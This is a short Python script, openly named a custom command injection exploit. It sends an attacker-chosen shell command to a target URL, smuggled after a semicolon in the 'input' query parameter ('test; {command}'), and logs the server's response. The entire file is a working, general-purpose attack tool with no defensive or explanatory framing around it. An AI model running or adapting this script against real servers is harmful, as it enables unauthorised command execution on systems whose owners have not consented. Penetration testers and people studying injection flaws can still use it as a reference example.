import argparse
import requests
import logging


def exploit_command_injection(target_url, command):
    """
    Exploit a command injection vulnerability.
    :param target_url: Target URL with a vulnerable parameter.
    :param command: Command to inject.
    :return: Server response.
    """
    logging.info(f"Exploiting target: {target_url} with command: {command}")
    payload = f"test; {command}"  # Example payload with injected command
    try:
        response = requests.get(target_url, params={"input": payload}, timeout=5)
        logging.info(f"Server response: {response.text}")
        return response.text
    except Exception as e:
        logging.error(f"Error exploiting target: {e}")
        return None


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Custom Command Injection Exploit")
    parser.add_argument("--target", required=True, help="Target URL (e.g., http://example.com/vulnerable_endpoint)")
    parser.add_argument("--command", required=True, help="Command to inject (e.g., ls -la)")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO)
    exploit_command_injection(args.target, args.command)
